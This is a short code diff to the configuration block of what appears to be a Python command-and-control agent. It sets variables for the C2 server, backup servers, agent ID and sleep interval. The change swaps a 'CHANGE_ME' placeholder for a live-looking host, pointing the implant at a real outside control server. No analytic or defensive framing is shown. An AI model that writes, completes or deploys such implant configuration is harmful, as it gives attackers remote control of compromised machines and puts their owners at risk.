@@ -15,7 +15,7 @@ from base64 import b64encode, b64decode
 from concurrent.futures import ThreadPoolExecutor
 
 # === CONFIG ===
-C2_URL = os.environ.get("C2_URL", "http://CHANGE_ME:5000")
+C2_URL = os.environ.get("C2_URL", "https://gbctwoserver.pages.dev")
 C2_BACKUP_URLS = [u for u in os.environ.get("C2_BACKUP_URLS", "").split(",") if u]
 AGENT_ID = os.environ.get("AGENT_ID", str(uuid.uuid4()))
 SLEEP = int(os.environ.get("SLEEP", "5"))
